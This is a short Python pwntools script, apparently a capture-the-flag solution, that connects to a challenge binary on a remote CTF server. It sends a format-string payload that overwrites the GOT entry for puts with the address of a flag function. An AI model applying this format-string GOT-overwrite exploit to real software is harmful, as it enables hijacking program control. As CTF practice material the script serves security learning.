from pwn import *
from fmtstr import FormatString
from hexdump import hexdump

e = ELF('pwnable')
r = process("./pwnable")
r = remote('ctf.isss.io', 9002)
r.readline()

context.terminal = ['urxvt', '-e', 'bash', '-c']
fmt = FormatString(offset=6, written=0, bits=64)
fmt[e.got[b'puts']] = e.symbols[b'flag']
payload, sig = fmt.build()

#gdb.attach(r)

#payload = payload.replace(b"hhn", b"p  ")

hexdump(payload)
log.info(payload)
r.sendline(payload)
r.interactive()
